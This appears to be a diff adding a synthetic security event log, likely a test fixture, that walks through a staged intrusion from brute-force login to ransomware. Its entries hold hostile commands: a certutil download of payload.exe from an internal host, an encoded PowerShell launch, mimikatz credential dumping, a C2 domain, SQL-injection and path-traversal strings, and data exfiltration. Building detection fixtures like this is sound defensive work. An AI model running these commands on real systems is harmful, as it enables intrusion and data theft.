@@ -1,0 +1,46 @@
+2024-03-15 08:15:23 Authentication failed for user admin from 192.168.1.105 on WORKSTATION-01
+2024-03-15 08:15:45 Authentication failed for user admin from 192.168.1.105 on WORKSTATION-01
+2024-03-15 08:16:02 Authentication failed for user admin from 192.168.1.105 on WORKSTATION-01
+2024-03-15 08:16:18 Authentication failed for user admin from 192.168.1.105 on WORKSTATION-01
+2024-03-15 08:16:35 Authentication failed for user admin from 192.168.1.105 on WORKSTATION-01
+2024-03-15 08:16:52 Authentication failed for user admin from 192.168.1.105 on WORKSTATION-01
+2024-03-15 08:17:01 Authentication succeeded for user admin from 192.168.1.105 on WORKSTATION-01
+2024-03-15 08:18:10 User admin granted elevated privileges via sudo on WORKSTATION-01
+2024-03-15 08:18:15 User admin added to group Administrators on WORKSTATION-01
+2024-03-15 08:19:30 Privilege escalation: user admin ran command as root on SERVER-DC01
+2024-03-15 08:20:00 Process created: powershell.exe -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0 by user admin on WORKSTATION-01 PID:4521 PPID:1024
+2024-03-15 08:20:22 Process created: cmd.exe /c certutil -urlcache -split -f http://10.0.0.50/payload.exe C:\temp\update.exe by user admin on WORKSTATION-01 PID:5102 PPID:4521
+2024-03-15 08:20:45 File downloaded: C:\temp\update.exe from http://10.0.0.50/payload.exe by user admin
+2024-03-15 08:21:00 Process created: rundll32.exe C:\temp\update.exe,DllMain by user admin on WORKSTATION-01 PID:6210 PPID:5102
+2024-03-15 08:21:30 Network connection: 192.168.1.105 -> 10.0.0.50:443 process:rundll32.exe established outbound connection
+2024-03-15 08:22:00 Network connection: 192.168.1.105 -> 10.0.0.50:443 beacon interval detected every 60s
+2024-03-15 08:22:30 DNS query: suspicious domain c2-beacon.evil.com from 192.168.1.105
+2024-03-15 08:23:00 Registry modified: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\UpdateService by user admin on WORKSTATION-01
+2024-03-15 08:24:00 Process created: mimikatz.exe by user admin on WORKSTATION-01 PID:7301 PPID:6210
+2024-03-15 08:24:15 Credential dump detected: lsass.exe memory access by mimikatz.exe on WORKSTATION-01
+2024-03-15 08:25:00 Authentication succeeded for user svc_backup from 192.168.1.105 on SERVER-DC01
+2024-03-15 08:25:30 User svc_backup lateral movement via SMB to SERVER-DB01 from 192.168.1.105
+2024-03-15 08:26:00 Network connection: 192.168.1.105 -> 192.168.1.200:445 SMB lateral movement
+2024-03-15 08:26:30 Authentication succeeded for user svc_backup from 192.168.1.105 on SERVER-DB01
+2024-03-15 08:27:00 File copied: C:\Users\admin\Documents\sensitive_data.xlsx to USB drive E: on WORKSTATION-01 by user admin
+2024-03-15 08:27:15 USB device connected: Kingston DataTraveler on WORKSTATION-01
+2024-03-15 08:27:30 File copied: C:\Users\admin\Documents\financial_report.pdf to USB drive E: on WORKSTATION-01 by user admin
+2024-03-15 08:28:00 File copied: \\SERVER-DB01\share\customer_db.sql to C:\temp\staging on WORKSTATION-01 by user svc_backup
+2024-03-15 08:28:30 Network connection: 192.168.1.105 -> 203.0.113.50:8443 large data transfer detected outbound
+2024-03-15 08:29:00 Data exfiltration suspected: 250MB uploaded to external IP 203.0.113.50 from 192.168.1.105
+2024-03-15 08:29:30 File deleted: C:\temp\update.exe by user admin on WORKSTATION-01
+2024-03-15 08:29:45 File deleted: C:\temp\staging\customer_db.sql by user admin on WORKSTATION-01
+2024-03-15 08:30:00 Event log cleared: Security log cleared by user admin on WORKSTATION-01
+2024-03-15 08:30:30 Firewall rule modified: Allow outbound 8443 added by user admin on WORKSTATION-01
+2024-03-15 08:31:00 Cloud API call: AWS DescribeInstances from IP 192.168.1.105 user admin region us-east-1
+2024-03-15 08:31:30 Cloud API call: AWS GetSecretValue from IP 192.168.1.105 user admin secret-id prod/db-creds
+2024-03-15 08:32:00 Web request: POST /admin/login from 10.0.0.99 status 403 user-agent sqlmap/1.5
+2024-03-15 08:32:15 Web attack: SQL injection attempt: ' OR 1=1-- from 10.0.0.99 on /api/users
+2024-03-15 08:32:30 Web request: GET /../../../../etc/passwd from 10.0.0.99 status 403
+2024-03-15 08:33:00 Account modified: user admin password changed on SERVER-DC01
+2024-03-15 08:33:30 New account created: user backdoor_svc on SERVER-DC01 by user admin
+2024-03-15 08:34:00 Webhook alert: anomalous login from geolocation Russia for user admin
+2024-03-15 08:34:30 MFA bypass detected for user admin on SERVER-DC01
+2024-03-15 08:35:00 Process created: wscript.exe C:\temp\script.vbs by user admin on WORKSTATION-01 PID:8420 PPID:6210
+2024-03-15 08:35:30 Ransomware indicator: multiple file extensions changed to .encrypted on WORKSTATION-01
+2024-03-15 08:36:00 Ransomware indicator: ransom note README_DECRYPT.txt created in C:\Users\ on WORKSTATION-01
